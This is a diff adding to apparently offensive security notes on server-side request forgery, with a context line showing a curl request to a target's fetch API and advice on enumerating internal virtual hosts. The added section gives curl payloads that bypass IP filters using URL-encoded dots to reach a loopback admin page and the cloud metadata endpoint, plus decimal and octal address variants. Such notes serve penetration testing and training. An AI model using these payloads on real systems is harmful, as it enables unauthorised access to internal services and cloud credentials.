@@ -33,3 +33,10 @@ curl -X POST <TARGET>/api/fetch -H 'Content-Type: application/json' -d '{
 ```
 Enumerate reachable internal vhosts by signing+fetching candidate hostnames in a loop (distinct "unknown host" vs real-response text is the oracle) — a vhost allowlist on the *outer* app doesn't protect the SSRF target.
 
+Hostname filter bypass via URL-encoded dot — a filter blocking IPs like `127.0.0.1` or `169.254.169.254` may not decode the URL before comparing; `127%2e0%2e0%2e1` passes the check and resolves to loopback at the HTTP layer:
+```bash
+curl "http://<TARGET>/fetch?url=http://127%2e0%2e0%2e1/admin"
+curl "http://<TARGET>/fetch?url=http://169%2e254%2e169%2e254/latest/meta-data/"
+# also try: decimal notation (2130706433 = 127.0.0.1), octal (0177.0.0.1), mixed encoding
+```
+
